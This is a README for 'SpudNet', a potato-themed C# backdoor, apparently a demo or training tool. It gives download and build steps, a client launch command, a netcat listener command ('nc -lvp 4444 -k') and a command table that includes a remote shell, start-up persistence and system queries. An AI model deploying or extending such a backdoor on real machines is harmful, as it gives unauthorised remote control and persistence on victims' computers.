# SpudNet
---
## Description
A Potato-themed backdoor developed in C#. 

![SpudNet](screenshots/spudnet.png)

## Requirements
- .NET Framework ≥ 4.7
- A Windows client running SpudBot.exe.
- A server listening for incomming connections. 

## Download
You can download the latest release of SpudBot.exe from https://github.com/malwaredetective/spudnet/releases/tag/v1.0.0. 

## Building from Source Code
- Clone a copy of the Github repository.
```
git clone https://github.com/malwaredetective/spudnet.git
```
- Open **SpudBot.Sln** within Visual Studio.
- Build the solution within Visual Studio. 

## Usage
On the client, launch **SpudBot.exe** with Command-line arguments pointing to the server you would like to connect too. 
```
SpudBot.exe "Server" "Port"
```
On the server, setup a listener to watch for inbound connections.
```
nc -lvp 4444 -k
```
The SpudNet framework contains built-in commands for the server to help *Spudify* the client.  

| Command | Description |
| --- | --- |
| help | Print out a list of Commands. |
| calc | Count Potatoes with Calculator. |
| desktop | Spudify the Clients Desktop Background. |
| download | Download LilSpud's favorite Poem. | 
| fact | Send LilSpud a random Spudfact. |
| search | Find Potatoes Near LilSpud. |
| shell | Establish a Command Shell with LilSpud. |
| startup | Launch Spudnet on start-up. |
| status | Report the Status of LilSpud. |
| whoami | Query System Information |
| exit | Terminate the Current Session. |

For additional information, review the command reference guide on the Wiki: https://github.com/malwaredetective/spudnet/wiki.

---
